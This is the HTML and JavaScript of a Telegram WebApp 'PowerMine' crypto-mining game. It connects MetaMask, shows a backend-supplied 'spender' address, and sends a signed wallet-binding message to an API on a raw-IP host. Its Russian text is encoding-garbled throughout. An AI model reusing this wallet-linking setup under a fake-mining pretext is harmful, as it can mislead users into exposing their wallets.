<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>üíé PowerMine ‚Äî SafeChain</title>

    <!-- –¢–≤–æ–π —Å—Ç–∏–ª—å/–∞–Ω–∏–º–∞—Ü–∏–∏ –º–∞–π–Ω–µ—Ä–∞ -->
    <link rel="stylesheet" href="https://erahozoqu763.github.io/maker/mainer.css" />

    <!-- Telegram WebApp SDK (–¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è tg_user_id –≤ –±–æ—Ç–µ) -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- ethers v6 –¥–ª—è MetaMask -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>

    <!-- –í–∏–∑—É–∞–ª –º–∞–π–Ω–µ—Ä–∞ (—Å–∫–æ—Ä–æ—Å—Ç—å/–∑–∞—Ä—è–¥/–ª–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ) -->
    <script src="https://erahozoqu763.github.io/maker/mainer.js" defer></script>

    <style>
        /* ===== –í–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å ===== */
        .web3-topbar {
            max-width: 980px;
            margin: 16px auto 0;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .web3-btn {
            padding: 8px 12px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.06);
            color: #fff;
            cursor: pointer;
        }
        .web3-btn[disabled] { opacity: 0.55; cursor: default; }
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
        .muted { color: #9aa3b2; }
        .ok { color: #36c692; }
        .warn { color: #ffcc66; }
        .err { color: #ff6b6b; }

        /* ===== Bottom-sheet (Hamster style) ===== */
        .sheet-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55);
            display: none;
            z-index: 1000;
        }
        .sheet-backdrop.show { display: block; }
        .sheet {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            bottom: 0;
            width: min(720px, 100%);
            max-height: 88vh;
            background: #121621;
            border: 1px solid #1f2537;
            border-radius: 16px 16px 0 0;
            box-shadow: 0 -20px 50px rgba(0,0,0,0.35);
            display: grid;
            grid-template-rows: auto auto 1fr auto;
            animation: slideUp .22s ease-out;
        }
        @keyframes slideUp {
            from { transform: translate(-50%, 18px); opacity: .95; }
            to   { transform: translate(-50%, 0);    opacity: 1; }
        }
        .sheet-header { position: relative; padding: 10px 16px 6px; }
        .sheet-handle {
            width: 44px; height: 4px; border-radius: 999px;
            margin: 4px auto 8px; background: #2b3146;
        }
        .sheet-title { font-weight: 700; text-align: center; }
        .sheet-close {
            position: absolute; right: 10px; top: 8px;
            background: transparent; border: 0; color: #fff; font-size: 1.2rem; cursor: pointer;
        }

        .sheet-subhead {
            padding: 0 16px 8px;
            display: grid; gap: 6px;
            border-bottom: 1px solid #1b2031;
        }
        .step-dots { display: flex; gap: 6px; justify-content: center; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #2e3550; }
        .dot.active { background: #7c9cff; }
        .small { font-size: .9rem; }

        .sheet-body { padding: 12px 16px; overflow: auto; }
        .sheet-footer {
            display: flex; gap: 8px; justify-content: space-between; align-items: center;
            padding: 12px 16px;
            border-top: 1px solid #1b2031;
            background: linear-gradient(to top, rgba(10,12,18,0.9), rgba(10,12,18,0.65));
            position: sticky; bottom: 0;
        }

        /* –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç—ã –≤ –º–æ–¥–∞–ª–∫–µ */
        .card { background: #151a28; border: 1px solid #212943; border-radius: 14px; padding: 12px; }
        .row-between { display: flex; justify-content: space-between; align-items: center; gap: 10px; }
        .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .grid2 .span2 { grid-column: span 2; }
        .badge {
            background: #1e2438; color: #9aa3b2; padding: 6px 10px; border-radius: 999px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
        }
        .state { margin-top: 8px; }

        .btn {
            border: 1px solid #2a3043; background: #24293a; color: #fff;
            padding: 12px 14px; border-radius: 12px; cursor: pointer;
        }
        .btn:hover { filter: brightness(1.05); }
        .btn.primary {
            background: linear-gradient(180deg, #6e8dff, #637dff);
            border-color: #6b83ff;
            font-weight: 700;
        }
        .btn.ghost { background: transparent; border-color: #2a3043; }

        /* –ë–ª–æ–∫ –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ */
        .confirm {
            margin-top: 10px; padding: 10px; border-radius: 10px;
            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üíé PowerMine</h1>
            <p class="subtitle">–ú–∞–π–Ω—å SC –∏ —É—Å–∫–æ—Ä—è–π —Å–≤–æ–π –¥–æ—Ö–æ–¥</p>
        </header>

        <!-- –í–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å: –∫–Ω–æ–ø–∫–∞ –≤—ã–∑—ã–≤–∞–µ—Ç bottom-sheet -->
        <div class="web3-topbar">
            <button id="btnOpenModal" class="web3-btn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
            <span id="miniState" class="muted">‚Äî</span>
        </div>

        <!-- –ü–∞–Ω–µ–ª—å –º–∞–π–Ω–µ—Ä–∞ (–∫–∞–∫ –≤ —Ç–≤–æ—ë–º –º–∞–∫–µ—Ç–µ) -->
        <div class="miner-panel">
            <div class="fan-container">
                <img id="fanImg" src="https://erahozoqu763.github.io/maker/img/mainer.png" alt="SafeChain –ú–∞–π–Ω–µ—Ä" draggable="false" />
                <div class="charge-indicator">
                    <span id="chargePercent">100%</span>
                </div>
            </div>

            <div class="stats">
                <div class="stat">
                    <span>‚ö° –°–∫–æ—Ä–æ—Å—Ç—å:</span>
                    <b id="speed">0.000000001</b> <small>SC/—Å–µ–∫</small>
                </div>
                <div class="stat">
                    <span>‚õèÔ∏è –ù–∞–º–∞–π–Ω–µ–Ω–æ:</span>
                    <b id="mined">0</b> <small>SC</small>
                </div>
                <div class="stat">
                    <span>üí∞ –ë–∞–ª–∞–Ω—Å:</span>
                    <b id="balance">0</b> <small>SC</small>
                </div>
                <div class="stat">
                    <span>üîã –ë—É—Å—Ç:</span>
                    <b id="boost">x1</b>
                </div>
            </div>

            <div class="progress-container">
                <label>–ó–∞—Ä—è–¥ –º–∞–π–Ω–µ—Ä–∞:</label>
                <div class="progress-bar">
                    <div id="chargeBar" class="progress"></div>
                </div>
            </div>

            <div class="actions">
                <button id="charge" class="btn btn-green">üîã –ó–∞—Ä—è–¥–∏—Ç—å –º–∞–π–Ω–µ—Ä</button>
                <button id="upgrade" class="btn btn-accent">‚ö° –£—Å–∫–æ—Ä–∏—Ç—å</button>
            </div>

            <p class="hint">‚è≥ –ú–∞–π–Ω–∏–Ω–≥ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è –¥–∞–∂–µ –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è WebApp ‚Äî –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –ª–æ–∫–∞–ª—å–Ω–æ.</p>
        </div>
    </div>

    <!-- üî≥ Bottom Sheet (—Ç–æ–ª—å–∫–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∏ –ø–æ–¥–ø–∏—Å—å –ø—Ä–∏–≤—è–∑–∫–∏) -->
    <div id="sheetWrap" class="sheet-backdrop" aria-hidden="true">
        <div class="sheet" role="dialog" aria-modal="true" aria-labelledby="sheetTitle">
            <header class="sheet-header">
                <div class="sheet-handle"></div>
                <div class="sheet-title" id="sheetTitle">–ü—Ä–∏–≤—è–∑–∫–∞ –∫–æ—à–µ–ª—å–∫–∞</div>
                <button id="sheetClose" class="sheet-close" aria-label="–ó–∞–∫—Ä—ã—Ç—å">‚úï</button>
            </header>

            <div class="sheet-subhead">
                <div class="step-dots">
                    <span id="dot1" class="dot active"></span>
                    <span id="dot2" class="dot"></span>
                </div>
                <div class="muted small" id="sheetHint">–®–∞–≥ 1 –∏–∑ 2 ‚Äî MetaMask</div>
            </div>

            <main class="sheet-body">
                <!-- STEP 1: Connect -->
                <section id="step1">
                    <div class="card">
                        <div class="row-between">
                            <div>
                                <div class="muted">–ê–¥—Ä–µ—Å</div>
                                <div id="addr" class="mono">‚Äî</div>
                            </div>
                            <div class="badge" id="netInfo">chainId: ‚Äî</div>
                        </div>
                        <div class="grid2" style="margin-top:10px;">
                            <div>
                                <div class="muted">SPENDER</div>
                                <div id="cfgSpender" class="mono">‚Äî</div>
                            </div>
                            <div>
                                <div class="muted">Chain ID (–∏–∑ API)</div>
                                <div id="cfgChainId" class="mono">‚Äî</div>
                            </div>
                            <div class="span2">
                                <div class="muted">API</div>
                                <div id="cfgApi" class="mono">‚Äî</div>
                            </div>
                        </div>
                        <div id="state1" class="state muted mono">‚Äî</div>
                    </div>
                </section>

                <!-- STEP 2: Bind (sign) -->
                <section id="step2" style="display:none;">
                    <div class="card">
                        <div class="grid2">
                            <div>
                                <div class="muted">Telegram ID</div>
                                <div id="tgIdView" class="mono">‚Äî</div>
                            </div>
                            <div>
                                <div class="muted">–ê–¥—Ä–µ—Å</div>
                                <div class="mono" id="addr2">‚Äî</div>
                            </div>
                        </div>
                        <div class="confirm">
                            <div class="muted">–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä —Å–æ–æ–±—â–µ–Ω–∏—è</div>
                            <pre id="msgPreview" class="mono" style="white-space:pre-wrap;margin:6px 0 0;">‚Äî</pre>
                        </div>
                        <div id="bindState" class="state muted mono">‚Äî</div>
                    </div>
                </section>
            </main>

            <footer class="sheet-footer">
                <button id="sheetBack" class="btn ghost" style="display:none;">‚Üê –ù–∞–∑–∞–¥</button>
                <button id="sheetCTA" class="btn primary">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å MetaMask</button>
            </footer>
        </div>
    </div>

    <script>
        /* ===== –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===== */
        const API_BASE_URL = "https://api.103.246.147.200.sslip.io"; // ‚Üê –ü–û–î–ú–ï–ù–ò –ù–ê –°–í–û–ô –ü–£–ë–õ–ò–ß–ù–´–ô API URL

        /* ===== –°–æ—Å—Ç–æ—è–Ω–∏–µ ===== */
        const STATE = {
            provider: null,
            signer: null,
            account: null,
            chainId: null,
            config: null
        };

        /* ===== –£—Ç–∏–ª–∏—Ç—ã DOM ===== */
        function $(id) { return document.getElementById(id); }
        function setDots(n) {
            [1,2].forEach(i => $("dot"+i).classList.toggle("active", i === n));
            $("sheetHint").textContent = (n === 1) ? "–®–∞–≥ 1 –∏–∑ 2 ‚Äî MetaMask" : "–®–∞–≥ 2 –∏–∑ 2 ‚Äî –ü–æ–¥–ø–∏—Å—å –ø—Ä–∏–≤—è–∑–∫–∏";
        }
        function showStep(n) {
            $("step1").style.display = (n === 1) ? "block" : "none";
            $("step2").style.display = (n === 2) ? "block" : "none";
            $("sheetBack").style.display = (n === 2) ? "inline-block" : "none";
            const cta = $("sheetCTA");
            cta.textContent = (n === 1)
                ? (STATE.account ? "–î–∞–ª–µ–µ ‚Üí" : "üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å MetaMask")
                : "‚úçÔ∏è –ü–æ–¥–ø–∏—Å–∞—Ç—å –∏ –ø—Ä–∏–≤—è–∑–∞—Ç—å";
            setDots(n);
        }
        function openSheet() {
            $("sheetWrap").classList.add("show");
            $("sheetWrap").setAttribute("aria-hidden","false");
            showStep(1);
        }
        function closeSheet() {
            $("sheetWrap").classList.remove("show");
            $("sheetWrap").setAttribute("aria-hidden","true");
        }

        /* ===== API ===== */
        async function apiGet(path, params = null) {
            const url = new URL(API_BASE_URL + path);
            if (params) Object.entries(params).forEach(([k,v]) => url.searchParams.set(k, v));
            const r = await fetch(url.toString(), { credentials: "omit" });
            if (!r.ok) throw new Error("API " + path + " failed: " + r.status);
            return r.json();
        }
        async function apiPost(path, body = {}) {
            const r = await fetch(API_BASE_URL + path, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
            if (!r.ok) throw new Error("API " + path + " failed: " + r.status);
            return r.json();
        }

        /* ===== Telegram ID ===== */
        function tgUserId() {
            try {
                if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe?.user?.id) {
                    return Number(Telegram.WebApp.initDataUnsafe.user.id);
                }
            } catch (_) {}
            const q = new URLSearchParams(location.search);
            const v = q.get("tg_user_id");
            return v ? Number(v) : null;
        }

        /* ===== –ö–æ–Ω—Ñ–∏–≥ —Å –±—ç–∫–∞ ===== */
        async function loadConfig() {
            const cfg = await apiGet("/api/config");
            STATE.config = cfg;
            $("cfgSpender").textContent = cfg.spender;
            $("cfgChainId").textContent = String(cfg.chainId);
            $("cfgApi").textContent = API_BASE_URL;
        }

        /* ===== MetaMask connect ===== */
        async function connect() {
            if (!window.ethereum) {
                alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω. –£—Å—Ç–∞–Ω–æ–≤–∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –∏–ª–∏ –æ—Ç–∫—Ä–æ–π –≤ –±—Ä–∞—É–∑–µ—Ä–µ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∫–æ—à–µ–ª—å–∫–∞.");
                return;
            }
            STATE.provider = new ethers.BrowserProvider(window.ethereum);
            await window.ethereum.request({ method: "eth_requestAccounts" });
            STATE.signer = await STATE.provider.getSigner();
            STATE.account = await STATE.signer.getAddress();
            const net = await STATE.provider.getNetwork();
            STATE.chainId = Number(net.chainId);

            $("addr").textContent = STATE.account;
            $("netInfo").textContent = "chainId=" + STATE.chainId;
            $("state1").textContent = "‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ. –£–±–µ–¥–∏—Å—å, —á—Ç–æ —Å–µ—Ç—å —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å Chain ID –∏–∑ API.";
            $("miniState").textContent = "–ü–æ–¥–∫–ª—é—á–µ–Ω–æ: " + STATE.account.slice(0,6) + "‚Ä¶" + STATE.account.slice(-4);

            // –ê–≤—Ç–æ-–ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Å–µ—Ç–∏ –ø—Ä–∏ –Ω–µ—Å–æ–≤–ø–∞–¥–µ–Ω–∏–∏
            if (STATE.config && STATE.chainId !== Number(STATE.config.chainId)) {
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: ethers.toBeHex(Number(STATE.config.chainId)) }],
                    });
                    const n2 = await STATE.provider.getNetwork();
                    STATE.chainId = Number(n2.chainId);
                    $("netInfo").textContent = "chainId=" + STATE.chainId;
                } catch (e) {
                    $("state1").innerHTML = "‚ö†Ô∏è <span class='warn'>–°–µ—Ç—å –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∫–æ–Ω—Ñ–∏–≥–æ–º. –ú–æ–∂–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å, –Ω–æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –º–æ–≥—É—Ç –Ω–µ –ø—Ä–æ–π—Ç–∏.</span>";
                }
            }
        }

        /* ===== –°–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ (SIWE-like) ===== */
        function buildBindMessage(tgId, address) {
            const now = new Date().toISOString();
            const nonce = Math.random().toString(36).slice(2);
            return `SafeChain Wallet Bind

Bind Telegram ID: ${tgId}
Address: ${address}
ChainId: ${STATE.chainId}
Timestamp: ${now}
Nonce: ${nonce}`;
        }

        async function prepareStep2() {
            const id = tgUserId();
            $("tgIdView").textContent = id ? String(id) : "‚Äî";
            $("addr2").textContent = STATE.account || "‚Äî";

            if (!STATE.account || !id) {
                $("bindState").textContent = "–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫ –∏ Telegram ID (–æ—Ç–∫—Ä–æ–π —á–µ—Ä–µ–∑ WebApp –≤ –±–æ—Ç–µ).";
                return;
            }
            const msg = buildBindMessage(id, STATE.account);
            $("msgPreview").textContent = msg;
            $("bindState").textContent = "–ì–æ—Ç–æ–≤ –∫ –ø–æ–¥–ø–∏—Å–∏.";
        }

        async function signAndBind() {
            const id = tgUserId();
            if (!id) { $("bindState").innerHTML = "‚ö†Ô∏è <span class='warn'>–ù–µ –Ω–∞–π–¥–µ–Ω Telegram ID.</span>"; return; }
            if (!STATE.signer || !STATE.account) { alert("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏ –∫–æ—à–µ–ª—ë–∫."); return; }

            const msg = buildBindMessage(id, STATE.account);
            let sig;
            try {
                sig = await STATE.signer.signMessage(msg);
            } catch {
                $("bindState").innerHTML = "‚ùå <span class='err'>–ü–æ–¥–ø–∏—Å—å –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.</span>";
                return;
            }
            try {
                const res = await apiPost("/api/bind", {
                    tg_user_id: Number(id),
                    address: STATE.account,
                    message: msg,
                    signature: sig
                });
                if (res && res.ok) {
                    $("bindState").innerHTML = "‚úÖ <span class='ok'>–ü—Ä–∏–≤—è–∑–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞.</span>";
                    setTimeout(closeSheet, 700);
                } else {
                    $("bindState").innerHTML = "‚ö†Ô∏è <span class='warn'>–û—Ç–≤–µ—Ç API –±–µ–∑ ok=true.</span>";
                }
            } catch (e) {
                $("bindState").innerHTML = "‚ùå <span class='err'>–û—à–∏–±–∫–∞ API bind: " + (e.message || e) + "</span>";
            }
        }

        /* ===== Bootstrap / —Å–æ–±—ã—Ç–∏—è ===== */
        document.addEventListener("DOMContentLoaded", async () => {
            // –ó–∞–≥—Ä—É–∑–∏–º –∫–æ–Ω—Ñ–∏–≥ —Å—Ä–∞–∑—É
            try { await loadConfig(); } catch { /* –ø–æ–∫–∞–∂–µ–º –ø–æ–∑–∂–µ –≤ UI */ }

            // –ò–Ω—Ñ–æ –æ –∑–∞–ø—É—Å–∫–µ
            const id = tgUserId();
            $("miniState").textContent = id
                ? ("–û—Ç–∫—Ä—ã—Ç–æ –∏–∑ Telegram WebApp ‚Ä¢ ID " + id)
                : "–û—Ç–∫—Ä–æ–π —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É WebApp –≤ –±–æ—Ç–µ (–∏–ª–∏ –¥–æ–±–∞–≤—å ?tg_user_id=...)";

            // –û—Ç–∫—Ä—ã—Ç–∏–µ/–∑–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª–∫–∏
            $("btnOpenModal").addEventListener("click", openSheet);
            $("sheetClose").addEventListener("click", closeSheet);
            $("sheetWrap").addEventListener("click", (e) => {
                if (e.target.id === "sheetWrap") closeSheet();
            });
            $("sheetBack").addEventListener("click", () => showStep(1));

            // –ì–ª–∞–≤–Ω–∞—è CTA –ª–æ–≥–∏–∫–∞
            $("sheetCTA").addEventListener("click", async () => {
                if ($("step1").style.display !== "none") {
                    if (!STATE.account) await connect();
                    showStep(2);
                    await prepareStep2();
                } else {
                    await signAndBind();
                }
            });
        });
    </script>
</body>
</html>
